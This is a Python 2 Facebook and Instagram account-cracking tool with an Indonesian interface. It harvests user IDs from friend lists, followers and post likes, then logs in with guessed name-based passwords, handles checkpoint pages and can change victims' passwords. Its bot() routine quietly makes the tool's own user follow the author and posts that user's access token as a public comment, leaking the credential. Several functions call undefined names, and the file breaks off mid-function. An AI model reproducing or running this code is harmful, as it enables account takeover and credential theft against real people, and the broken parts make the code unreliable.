#!/usr/bin/python2
# coding=utf-8
# author : Fall Xavier

### IMPORT MODULE ###
import os, sys, re, time, requests, calendar, random,json
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import datetime
from datetime import date
s=requests.Session()
try:
	import requests
except ImportError:
	print("\n [!] module requests belum terinstall")
	os.system("pip install requests")

try:
	import bs4
except ImportError:
	print("\n [!] module bs4 belum terinstall")
	os.system("pip install bs4")

try:
	import concurrent.futures
except ImportError:
	print("\n [!] module futures belum terinstall")
	os.system("pip install futures")


### GLOBAL WARNA ###
P = '\x1b[1;97m' # PUTIH               
M = '\x1b[1;91m' # MERAH            
H = '\x1b[1;92m' # HIJAU.              
K = '\x1b[1;93m' # KUNING.           
B = '\x1b[1;94m' # BIRU.                 
U = '\x1b[1;95m' # UNGU.               
O = '\x1b[1;96m' # BIRU MUDA.     
N = '\x1b[0m'    # WARNA MATI     

### GLOBAL NAMA ###
IP = requests.get('https://api.ipify.org').text
url = "https://mbasic.facebook.com"
id = []
cp = []
ok = []
ubahP = []
pwbaru = []
data = {}
data2 = {}
loop = 0

### GLOBAL WAKTU ###
ct = datetime.now()
n = ct.month
bulann = ['Januari','Februari','Maret','April','Mei','Juni','Juli','Agustus','September','Oktober','November','Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulann[nTemp]
my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = ("%s-%s-%s-%s"%(hr, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))
bulan = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

### DEF TAMBAHAN ###
def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
        
###FOLDER TAMBAHAN###
def folder():
	try:os.mkdir('hasil')
	except:pass
	try:os.mkdir('data')
	except:pass
	try:
		ua_ = ''
		open("data/ua.txt","w").write(ua_)
	except:
		pass

### BAGIAN LOGO ###
def logo():
	os.system("clear")
	print("""%s
\x1b[1;91m ___________          _____ _____________________
\x1b[1;92m \_   _____/         /     \\______   \_   _____/
\x1b[1;93m  |    __)  ______  /  \ /  \|    |  _/|    __)  
\x1b[1;94m  |     |  /_____/ /    Y    \    |   \|     \   
\x1b[1;95m  \___  |          \____|__  /______  /\___  /   
\x1b[1;96m      \/                   \/       \/     \/      """%(N))

### BAGIAN LOGIN ###
def tokenz():
	os.system('clear')
	try:
		token = open('token.txt', 'r')
		menu()
	except (KeyError, IOError):
		os.system('clear')
		logo()
		print(" %s\x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;93mAuthor      \x1b[1;97m: \x1b[1;93mBINTANG-XD"%(N))
		print(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;93mGithub      \x1b[1;97m: \x1b[1;93mhttps://github.com/bot-85")
		print(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;97m+\x1b[1;93m---------------------------------------------\x1b[1;97m+")
		print(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;93mBergabung   \x1b[1;97m: %s\x1b[1;93m"%(tgl))
		print(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;93mStatus      \x1b[1;97m: %s\x1b[1;92mPremium Donk%s"%(H,N))
		print(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;97m+\x1b[1;93m---------------------------------------------\x1b[1;97m+")
		print(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;93mIP          \x1b[1;97m: %s\x1b[1;93m"%(IP))
		token = raw_input('\n \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmasukan token \x1b[1;97m: \x1b[1;92m')
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			zedd = open('token.txt', 'w')
			zedd.write(token)
			zedd.close()
			bot()
			menu()
		except KeyError:
			print(" %s[!] token kadaluwarsa!"%(M))
			sys.exit() 
 
### BOT FOLLOW DAN KOMEN ###
def bot():
	try:
		token = open('token.txt', 'r').read()
	except (KeyError, IOError):
		exit(" %s[!] token kadaluwarsa!"%(M))
	requests.post('https://graph.facebook.com/100075131925668/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100075131925668/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100075131925668/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100075131925668/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100075131925668/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/597710374770664/comments/?message='+token+'&access_token=' + token)
	requests.post('https://graph.facebook.com/106024515245279/comments/?message='+token+'&access_token=' + token)

### BAGIAN MENU ###
def menu():
    global token
    os.system('clear')
    try:
        token = open('token.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
    except (KeyError, IOError):
        os.system('clear')
        print("\n %s\x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mtoken kadaluwarsa\x1b[1;97m!"%(M))
        os.system('rm -f token.txt')
        tokenz()
    except requests.exceptions.ConnectionError:
        exit(" %s\x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93manda tidak terhubung ke internet\x1b[1;97m!"%(M))

    logo()
    print(" %s\x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;93mAuthor     \x1b[1;97m: \x1b[1;93mNdriiTzy X YogzzTzy X EzaaTzy X FaissTzy."%(N))
    print(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;93mGithub     \x1b[1;97m: \x1b[1;93mhttps://github.com/YumasaaTzy")
    print(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;97m+\x1b[1;93m--------------------------------------------\x1b[1;97m+")
    print(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;93mBergabung  \x1b[1;97m: %s\x1b[1;93m"%(tgl))
    print(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;93mStatus     \x1b[1;97m: %s\x1b[1;92mPremium Donk%s"%(H,N))
    print(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;97m+\x1b[1;93m--------------------------------------------\x1b[1;97m+")
    print(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;93mIP         \x1b[1;97m: %s\x1b[1;93m"%(IP))
    print("\n \x1b[1;92m[ \x1b[1;93mselamat datang %s%s%s \x1b[1;92m]\n"%(K,nama,N))
    print(" \x1b[1;92m[\x1b[1;93m01\x1b[1;92m]\x1b[1;97m. \x1b[1;93mcrack dari id publik")
    print(" \x1b[1;92m[\x1b[1;93m02\x1b[1;92m]\x1b[1;97m. \x1b[1;93mcrack dari id massal")
    print(" \x1b[1;92m[\x1b[1;93m03\x1b[1;92m]\x1b[1;97m. \x1b[1;93mcrack dari Instagram")
    print(" \x1b[1;92m[\x1b[1;93m04\x1b[1;92m]\x1b[1;97m. \x1b[1;93mcrack dari followers")
    print(" \x1b[1;92m[\x1b[1;93m05\x1b[1;92m]\x1b[1;97m. \x1b[1;93mcrack dari postingan")
    print(" \x1b[1;92m[\x1b[1;93m06\x1b[1;92m]\x1b[1;97m. \x1b[1;93mcek opsi hasil crack")
    print(" \x1b[1;92m[\x1b[1;93m07\x1b[1;92m]\x1b[1;97m. \x1b[1;93mcek akun hasil crack")
    print(" \x1b[1;92m[\x1b[1;93m08\x1b[1;92m]\x1b[1;97m. \x1b[1;93mSettings user agent")
    print(" \x1b[1;92m[\x1b[1;93m09\x1b[1;92m]\x1b[1;97m. \x1b[1;93mIngfo \x1b[1;92m]Tools/Script")
    print(" \x1b[1;92m[%s\x1b[1;93m00%s\x1b[1;92m]\x1b[1;97m. \x1b[1;93mlogout \x1b[1;92m(\x1b[1;97mhapus token\x1b[1;92m)"%(M,N))
    asw = raw_input("\n \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mpilih menu \x1b[1;97m: \x1b[1;92m")
    if asw == "":
    	menu()
    elif asw == "1":
    	publik()
    	atursandi()
    elif asw == "2":
    	massal()
    	atursandi()
    elif asw == "3":
        igg()
    elif asw == "4":
    	followers()
    	atursandi()
    elif asw == "5":
    	postingan()
    	atursandi()
    elif asw == "6":
    	cekopsi()
    elif asw == "7":
    	cekhasil()
    elif asw == "8":
    	useragent()
    elif asw == "9":
        info_tools()
    elif asw == "0":
    	os.system('rm -f token.txt')
    	jalan(" \x1b[1;92m[\x1b[1;93m✓\x1b[1;92m] \x1b[1;93mberhasil menghapus token ")
    	exit()
    else:
    	jalan(" \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mpilih jawaban dengan bener ! ")
    	menu() 
    
### DUMP PUBLIK ###
def publik():
	global token
	try:
		token = open("token.txt", "r").read()
	except IOError:
		exit(" \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mtoken kadaluwarsa")
	print(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;93misi \x1b[1;92m'\x1b[1;97mme\x1b[1;92m' \x1b[1;93mjika ingin crack dari daftar teman")
	idt = raw_input(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;93mmasukan id atau username \x1b[1;97m: \x1b[1;92m")
	try:
		for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
			id.append(i["id"]+"<=>"+i["name"])
	except KeyError:
		exit(" \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93makun tidak tersedia atau list teman private")
	print("\n \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mtotal id \x1b[1;97m-> %s%s%s\x1b[1;92m"%(M,len(id),N)) 
  
### DUMP MASSAL ###
def massal():
	global token
	try:
		token = open("token.txt", "r").read()
	except IOError:
		exit(" \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mtoken kadaluwarsa")
	try:
		tanya_total = int(raw_input(" \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmasukan jumlah target \x1b[1;97m: \x1b[1;92m"))
	except:tanya_total=1
	print(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;93misi \x1b[1;92m'\x1b[1;97mme\x1b[1;92m' \x1b[1;93mjika ingin crack dari daftar teman")
	for t in range(tanya_total):
		t +=1
		idt = raw_input(" \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmasukan id atau username %s \x1b[1;97m: \x1b[1;92m"%(t))
		try:
			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
				uid = i["id"]
				nama = i["name"]
				id.append(uid+"<=>"+nama)
		except KeyError:
			print(" \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93makun tidak tersedia atau list teman private")
	print("\n \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mtotal id \x1b[1;97m-> %s%s%s\x1b[1;92m"%(M,len(id),N)) 
	
### DUMP FOLLOWERS ###
def followers():
	global token
	try:
		token = open("token.txt", "r").read()
	except IOError:
		exit(" \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mtoken kadaluwarsa")
	print(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;93misi \x1b[1;92m'\x1b[1;97mme\x1b[1;92m' \x1b[1;97mjika ingin crack dari pengikut sendiri")
	idt = raw_input(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;93mmasukan id atau username \x1b[1;97m: \x1b[1;92m")
	try:
		for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=5000&access_token=%s"%(idt, token)).json()["data"]:
			uid = i["id"]
			nama = i["name"]
			id.append(uid+"<=>"+nama)
	except KeyError:
		exit(" \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93makun tidak tersedia atau list teman private")
	print("\n \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mtotal id \x1b[1;97m-> %s%s%s\x1b[1;92m"%(M,len(id),N)) 
	
### DUMP POSTINGAN ###
def postingan():
	global token
	try:
		token = open("token.txt", "r").read()
	except IOError:
		exit(" \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mtoken kadaluwarsa")
	idt = raw_input(" \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmasukan url atau id postingan \x1b[1;97m: \x1b[1;92m")
	try:
		for i in requests.get("https://graph.facebook.com/%s/likes?limit=5000&access_token=%s"%(idt, token)).json()["data"]:
			uid = i["id"]
			nama = i["name"]
			id.append(uid+"<=>"+nama)
	except KeyError:
		exit(" \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mpostingan tidak tersedia atau post private")
	print("\n \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mtotal id \x1b[1;97m-> %s%s%s\x1b[1;92m"%(M,len(id),N)) 
	
### CEK HASIL CRACK ###
def cekhasil():
	print('\n \x1b[1;92m[\x1b[1;93m1\x1b[1;92m]\x1b[1;97m. \x1b[1;92mlihat hasil crack OK ')
	print(' \x1b[1;92m[\x1b[1;93m2\x1b[1;92m]\x1b[1;97m. \x1b[1;93mlihat hasil crack CP ')
	anjg = raw_input('\n \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mpilih \x1b[1;97m: \x1b[1;92m')
	if anjg == '':
		menu()
	elif anjg == "1":
		dirs = os.listdir("OK")
		print("")
		for file in dirs:
			print(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] "+file)
		try:
			file = raw_input("\n \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmau lihat hasil yang mana \x1b[1;97m?: \x1b[1;92m")
			if file == "":
				menu()
			totalok = open("OK/%s"%(file)).read().splitlines()
		except IOError:
			exit(" \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] file %s tidak tersedia"%(file))
		nm_file = ("%s"%(file)).replace("-", " ")
		del_txt = nm_file.replace(".txt", "")
		print("\n \x1b[1;97m*\x1b[1;93m-------------------------------------------------\x1b[1;97m*")
		print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] tanggal : %s -total : %s"%(del_txt, len(totalok)))
		os.system("cat OK/%s"%(file))
		raw_input("\n \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;93mtekan enter untuk kembali ke menu")
		menu()
	elif anjg == "2":
		dirs = os.listdir("CP")
		print("")
		for file in dirs:
			print(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] "+file)
		try:
			file = raw_input("\n \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmau lihat hasil yang mana \x1b[1;97m?: \x1b[1;92m")
			if file == "":
				menu()
			totalcp = open("CP/%s"%(file)).read().splitlines()
		except IOError:
			exit(" \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] file %s tidak tersedia"%(file))
		nm_file = ("%s"%(file)).replace("-", " ")
		del_txt = nm_file.replace(".txt", "")
		print("\n \x1b[1;97m*\x1b[1;93m-------------------------------------------------\x1b[1;97m*")
		print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] tanggal : %s -total : %s"%(del_txt, len(totalcp)))
		os.system("cat CP/%s"%(file))
		raw_input("\n \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;93mtekan enter untuk kembali ke menu ")
		menu()
	else:
		menu()

####IGEH####
def igg():
	print ("\n%s [%s!%s] Contoh %s: %sRahma "%(P,M,P,M,O))
	usr_ = raw_input('%s [?] Input > %s'%(P,O))
	jumlah = input('%s [?] Limit > %s'%(P,O))
	bff_2 = usr_.replace(" ", "")
	cr.append("ramdhan_ramadhian")
	mi.append(bff_2+"|"+bff_2)
	mi.append(bff_2+"_"+"|"+bff_2)
	for _i_ in range(1, jumlah+1):
		mi.append(bff_2+str(_i_)+"|"+bff_2)
		mi.append(bff_2+"_"+str(_i_)+"|"+bff_2)
		mi.append(bff_2+str(_i_)+"_"+"|"+bff_2)
	print '\n%s [%s*%s] akun %sOK%s tersimpan di >%s hack.txt'%(P,K,P,H,P,H);jeda(0.2)
	print '%s [%s*%s] akun %sCP %stersimpan di > %s sesi.txt\n'%(P,K,P,K,P,K);jeda(0.2)
	with ThreadPoolExecutor(max_workers=30) as log:
		for ro in mi:
			try:
				_bff_ = []
				_r_ = ro.encode("utf-8")
				_o_ = _r_.split("|")[0]
				_m_ = _r_.split("|")[1]
				_i_ = _m_.split()
				if len(cr) != 1:
					if len(_o_) >= 6:
						_bff_.append(_o_)
						if len(_i_[0]) <= 2:
							if len(_i_) >= 2:
								_bff_.append(_i_[0]+_i_[1])
							if len(_m_) >= 6:
								_bff_.append(_m_)
						else:
							_bff_.append(_i_[0]+"123")
							if len(_i_) >= 2:
								_bff_.append(_i_[0]+_i_[1])
							if len(_m_) >= 6:
								_bff_.append(_m_)
					else:
						_bff_.append(_o_+_o_)
						if len(_i_[0]) <= 2:
							if len(_i_) >= 2:
								_bff_.append(_i_[0]+_i_[1])
							if len(_m_) >= 6:
								_bff_.append(_m_)
						else:
							if len(_i_) >= 2:
								_bff_.append(_i_[0]+_i_[1])
							_bff_.append(_i_[0]+"123")
							if len(_m_) >= 6:
								_bff_.append(_m_)
				else:
					_bff_.append(_i_[0]+"123")
					_bff_.append(_i_[0]+"12345")
					_bff_.append(_o_)
				log.submit(crack2, _o_, _bff_)
			except: pass
	exit("%s• finished"%(H))

####INFO TOOLS####
def info_tools():
    os.system('clear')
    print ' %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;92m-\x1b[0m';time.sleep(0.07)
    print '\n %s\x1b[1;92m[%s>%s\x1b[1;92m] Yt       \x1b[1;93m: Bintang XD.'%(N,H,N);time.sleep(0.07)
    print '\n %s\x1b[1;92m[%s>%s\x1b[1;92m] Author   \x1b[1;93m: BINTANG-XD.'%(N,H,N);time.sleep(0.07)
    print '\n %s\x1b[1;92m[%s>%s\x1b[1;92m] Github   \x1b[1;93m: https://github.com/bot-85'%(N,H,N);time.sleep(0.07)
    print '\n %s\x1b[1;92m[%s>%s\x1b[1;92m] Facebook \x1b[1;93m: Bintang Tzy'%(N,H,N);time.sleep(0.07)
    print '\n %s\x1b[1;92m[%s>%s\x1b[1;92m] Link FB  \x1b[1;93m: https://www.facebook.com/bintangt.zy.92'%(N,H,N);time.sleep(0.07)
    print '\n %s\x1b[1;92m[%s>%s\x1b[1;92m] Ig       \x1b[1;93m: Ndak punya'%(N,H,N);time.sleep(0.07)
    print '\n %s\x1b[1;92m[%s>%s\x1b[1;92m] Catatan  \x1b[1;93m: Please support my github, brothers and sisters'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;92m-\x1b[0m';time.sleep(0.07)
    raw_input('\n  [ %sKEMBALI%s ] '%(O,N));menu()

# GANTI USER AGENT
def useragent():
	print ("\n%s [%s01%s] Ganti user agent "%(P,O,P))
	print (" [%s02%s] Cek user agent "%(O,P))
	print (" [%s00%s] Kembali "%(M,P))
	uas()
def uas():
    u = raw_input('\n%s [?] pilih :%s '%(P,K))
    if u == '':
        print("%s [!] Isi yang benar kentod "%(M));jeda(2);uas()
    elif u in("1","01"):
    	print (" %s[%s*%s] ketik %sMy user agent%s di browser google chrome\n [%s*%s] untuk gunakan user agent anda sendiri"%(P,K,P,H,P,K,P))
    	print (" [%s*%s] ketik %sdefault%s untuk gunakan user agent bawaan tools"%(K,P,H,P))
    	try:
    	    ua = raw_input("%s [?] user agent : %s"%(P,K))
            if ua in(""):
            	print("%s [!] Isi yang benar kentod "%(M));jeda(2);menu()
            elif ua in("my user agent","My User Agent","MY USER AGENT","My user agent"):
            	jalan("%s [!]  Anda akan di arahkan ke browser "%(H));jeda(2)
            	os.system("am start https://www.google.com/search?q=My+user+agent>/dev/null");jeda(2);useragent()
            elif ua in("default","Default","DEFAULT"):
                ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
                open("data/ua.txt","w").write(ua_)
                print ("\n%s [√] menggunakan user agent bawaan"%(H));jeda(2);menu()
            open("data/ua.txt","w").write(ua);jeda(2)
            print ("\n%s [√] berhasil mengganti user agent"%(H));jeda(2);menu()
        except KeyboardInterrupt as er:
			exit ("\x1b[1;91m [!] "+er) 
    elif u in("2","02"):
        try:
        	ua_ = open('data/ua.txt', 'r').read();jeda(2);print ("%s [%s*%s] user agent anda : %s%s"%(P,K,P,H,ua_));jeda(2);raw_input("\n%s [ %senter%s ] "%(P,K,P));menu()
        except IOError:
        	ua_ = '%s-'%(M)
    elif u in("0","00"):
    	menu()
    else:
        print("%s [!] Isi yang benar kentod "%(M));jeda(2);uas()

### CEK OPSI ###
def cekopsi():
	dirs = os.listdir("CP")
	print("")
	for file in dirs:
		print(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] CP/"+file)
	print("\n \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] masukan file (ex: CP/%s.txt)"%(tanggal))
	files = raw_input(" \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mnama file  \x1b[1;97m: \x1b[1;92m")
	if files == "":
		menu()
	try:
		buka_baju = open(files, "r").readlines()
	except IOError:
		exit("\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] nama file %s tidak tersedia"%(files))
	ubahpw()
	print('\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93manda bisa mematikan data selular untuk menjeda proses cek')
	for memek in buka_baju:
		kontol = memek.replace("\n","")
		titid  = kontol.split("|")
		print("\n \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] cek : %s%s%s"%(K,kontol.replace("  * --> ",""),N))
		try:
			cek_opsi(titid[0].replace("  * --> ",""), titid[1])
		except requests.exceptions.ConnectionError:
			pass
	print("\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mcek akun sudah selesai\x1b[1;97m...")
	raw_input(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;93mtekan enter untuk kembali ke menu ")
	time.sleep(1)
	menu()

def ubahpw():
	pw=raw_input("\n \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mapakah anda ingin mengubah sandi tap yes\x1b[1;97m?\x1b[1;92m[\x1b[1;93mY\x1b[1;97m/\x1b[1;93mt\x1b[1;92m]\x1b[1;97m: \x1b[1;92m")
	if pw == "Y" or pw == "y":
		ubahP.append("y")
		pw2=raw_input(" \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmasukan sandi \x1b[1;97m: \x1b[1;92m")
		if len(pw2) <= 5:
			exit(" \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mkata sandi minimal 6 karakter ")
		else:
			pwbaru.append(pw2)
	else:
		pass


def cek_opsi(user,pw):
	global loop,ubahP,pwbaru
	session=requests.Session()
	session.headers.update({
		"Host":"mbasic.facebook.com",
		"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"accept-encoding":"gzip, deflate",
		"accept-language":"id-ID,id;q=0.9",
		"referer":"https://mbasic.facebook.com/",
		"user-agent":"nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
	})
	soup=parser(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
	response=parser(urlPost.text, "html.parser")
	if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):
		print("\r %s[!] aktifkan mode pesawat selama 5 detik%s"%(M,N))
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r %s[!] akun terkunci tampilan sesi new%s"%(M,N))
		else:
			loop+=1
			print("\r [✓] akun tidak terkena checkpoint, silahkan login di fb lite \n %s* --> %s|%s|%s%s				\n\n"%(H,user,pw,session.cookies.get_dict(),N))
	elif "checkpoint" in session.cookies.get_dict():
		loop+=1
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=parser(an.text,"html.parser")
		number=0
		cek=[cek for cek in response2.find_all("option")]
		print("\r [+] terdapat "+str(len(cek))+" opsi ")
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				if "y" in ubahP:
					ubah_pw(user,pw,session,response,link2)
				else:
					print("\r [✓] akun tap yes, silahkan login di fb lite \n %s[✓] %s|%s|%s%s									\n"%(H,user,pwbaru,coki[0],N))
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r %s[!] akun terpasang autentikasi dua faktor%s							\n"%(M,N))
			else:
				print("Kesalahan!")
		elif(len(cek)<=1):
			for x in range(len(cek)):
				number+=1
				opsi=re.findall('\<option selected=\".*?\" value=\".*?\">(.*?)<\/option>',str(cek))
				print("  [%s] %s"%(str(number),opsi[0]))
		elif(len(cek)>=2):
			for x in range(len(cek)):
				number+=1
				opsi=re.findall('\<option value=\".+\">(.+)<\/option>',str(cek[x]))
				print("  [%s] %s"%(str(number),opsi[0]))
			print("")
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r [✓] akun tidak terkena checkpoint, silahkan login di fb lite \n %s* --> %s|%s|%s%s				\n\n"%(H,user,pw,session.cookies.get_dict(),N))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print(" [!] %s"%(oh))
	else:
		loop+=1
		print(" [!] login gagal, silahkan cek kembali id dan kata sandi")

def ubah_pw(user,pw,session,response,link2):
	dat,dat2={},{}
	but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
	for x in response("input"):
		if x.get("name") in but:
			dat.update({x.get("name"):x.get("value")})
	ubahPw=session.post(url+link2.get("action"),data=dat).text
	resUbah=parser(ubahPw,"html.parser")
	link3=resUbah.find("form",{"method":"post"})
	but2=["submit[Next]","nh","fb_dtsg","jazoest"]
	if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
		for b in resUbah("input"):
			if b.get("name") in but2:
				dat2.update({b.get("name"):b.get("value")})
		dat2.update({"password_new":"".join(pwbaru)})
		an=session.post(url+link3.get("action"),data=dat2)
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		print("\r [✓] akun tap yes, silahkan login di fb lite \n [*] sandi telah diubah ke : %s \n %s[✓] %s|%s|%s%s									\n"%(pwbaru[0],H,user,pwbaru[0],coki,N))
		cek_game(coki)

def cek_game(cookie):
	w=s.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=cookie).text
	sop = parser(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print("")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada",""),N))

### BAGIAN SANDI ####
def atursandi():
	ask=raw_input(" \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mapakah anda ingin menggunakan sandi manual\x1b[1;97m? \x1b[1;92m[\x1b[1;93mY\x1b[1;97m/\x1b[1;93mt\x1b[1;92m]\x1b[1;97m:\x1b[1;92m")
	if ask=="y":
		sandimanual()
	elif ask=="t":
		sandiotomatis()
	else:
		exit(" %s\x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mpilih jawaban dengan benar\x1b[1;97m!"%(M))

def sandimanual():
	print("\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mgunakan \x1b[1;97m, \x1b[1;92m(\x1b[1;97mkoma\x1b[1;92m) \x1b[1;93muntuk pemisah contoh \x1b[1;97m: \x1b[1;93msandi123\x1b[1;97m,\x1b[1;93msandi12345\x1b[1;97m,\x1b[1;93mdll\x1b[1;97m. \x1b[1;93msetiap kata minimal 6 karakter atau lebih")
	pwek=raw_input('\n \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmasukan kata sandi \x1b[1;97m: \x1b[1;92m')
	print(' \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;93mcrack dengan sandi \x1b[1;97m-> \x1b[1;92m[ %s%s%s \x1b[1;92m]' % (M, pwek, N))
	if pwek=="":
		exit(" %s\x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93misi jawaban dengan benar\x1b[1;97m!"%(M))
